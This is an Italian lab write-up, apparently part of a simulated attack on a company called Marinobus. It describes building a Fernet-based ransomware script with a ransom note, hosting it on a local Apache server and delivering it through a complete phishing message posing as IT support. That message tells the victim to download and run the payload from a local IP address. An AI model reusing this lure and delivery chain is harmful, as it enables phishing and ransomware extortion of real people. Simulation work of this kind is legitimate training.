# FASE 3 - ATTACCO RANSOMWARE

Ricordiamo che l'attacco ransomware è un tipo malware che blocca dei dati sensibili
della vittima rendendoli illeggibili, poi richiedere un riscatto per ripristinarli

## FASE 3.1 - PREPARAZIONE DATI SENSIBILI (FINTI)

All'interno dell'ambiente kali, creiamo una cartella finta con all'interno un file
contenente dati sensibili come nome, cognome, e metodi di pagamento, molto importanti
per un attività che offre servizio di pagamento online.

## FASE 3.2 - INSTALLAZIONE DELLE LIBRERIE

Prima di procedere con la stesura del codice ransomware, in primis installiamo 
tutte le dipendenze e librerie necessarie al funzionamento del malware:
1- *sudo apt update*
2- *sudo apt install python3-cryptography -y*

## FASE 3.3 - CREAZIONE DEL CODICE RANSOMWARE - usando python

Con l'utilizzo del linguaggio di programmazione python si procede con la stesura
del codice di crypting e decrypting, in particolare utilizziamo la libreria
**Fernet** fa parte del pacchetto cryptography per Python e implementa un
protocollo di crittografia simmetrica autenticata pensato per essere sicuro,
semplice e "safe by default".

Il codice è composto da metodi ci crypting e decrypting del file e della cartella 
nel quale è contenuto; questi metodi utilizzano uan chiave simmetrica per poter
cifrare/decifrare codice, in particolare viene utilizzato l'algoritmo **AES-128**
in modalità *CBC* con l'aggiunta dell'autenticazione **HMAC-SHA256** Questo garantisce
che il file criptato non sia stato manomesso o corrotto. Se provi a decriptare un file alterato,
Fernet solleva un'eccezione invece di restituire dati spazzatura.

Per concludere, nel codice è stato inserito anche un modo per generare il messaggio di
ricatto, il quale, dopo che i file sono stati cryptati, viene generato nella stessa cartella
un file testo con l'eventuale richiesta di riscatto che, una volta adempiuta, procede
a ripristinare i dati.

a codice terminato si procede ad assegnare i vari permessi di esecuzione con:
*chmod +x ransomware_payload.py*

## FASE 3.4 - PREPARAZIONE DEL PAYLAOD

Ora che tutto è pronto è funzionante possiamo procedere con la creazione del payload che si
eseguira una volta installato nel dispositivo della vittima; 
Si procede come nella prima fase della simulazione, rendiamo il codice scaricabile in rete:
*cp ~/ransomware_win.py /var/www/html/*
Poi lanciamo la sessione di apache2 
*sudo systemctl start apache2*

Tutto questo verrà inviato tramite SMS della vittima, com il numero estrapolato nella fase 
precedente, ecco come verrà composto:

*From: IT Support <support@marinobus.it>*
*To: vittima@marinobus.it*
*Subject: ⚠️ Aggiornamento Sicurezza Urgente*

*Gentile Utente,*

*è stato rilevato un problema di sicurezza nel suo account.*
*Scarichi ed esegua immediatamente lo script di aggiornamento:*

*Download: http://192.168.230.132/ransomware_payload.py*

*Istruzioni:*
*1. Scarichi il file*
*2. Apra il terminale nella cartella Download*
*3. Esegua: chmod +x ransomware_payload.py*
*4. Esegua: python3 ransomware_payload.py*

*Grazie per la collaborazione,*
*IT Support Marinobus*

una volta eseguito, tutti i file verranno cryptati e la vittima dovrà seguire
le istruzioni per ripristinare il tutto.
